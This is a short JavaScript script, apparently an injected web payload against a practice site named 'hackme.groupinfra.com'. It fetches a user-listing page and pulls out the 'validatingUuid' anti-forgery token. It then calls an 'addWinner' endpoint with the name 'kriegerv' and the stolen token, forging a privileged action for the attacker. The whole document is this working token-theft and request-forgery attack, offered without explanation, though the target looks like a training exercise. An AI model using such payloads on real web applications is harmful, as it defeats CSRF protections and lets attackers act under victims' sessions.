function test(){
var req = null;
try { req = new XMLHttpRequest(); } catch(e) {}
if (!req) try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch(e) {}
if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
req.open('GET', 'http://hackme.groupinfra.com/obiwan/pages/listUsers', false);
req.send(null);
console.log("1." + req.responseText);
if(req.responseText){
var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value;
console.log("2." + validatingUuid);
if(validatingUuid){
var validatingUuidValue = $("[name='validatingUuid']")[0].value;
console.log("3." + validatingUuidValue);
req.open('GET', 'http://hackme.groupinfra.com/obiwan/pages/addWinner?name=kriegerv&validatingUuid='+ validatingUuid, false);
req.send(null);
console.log("4." + req.responseText);
}
}
}
test();
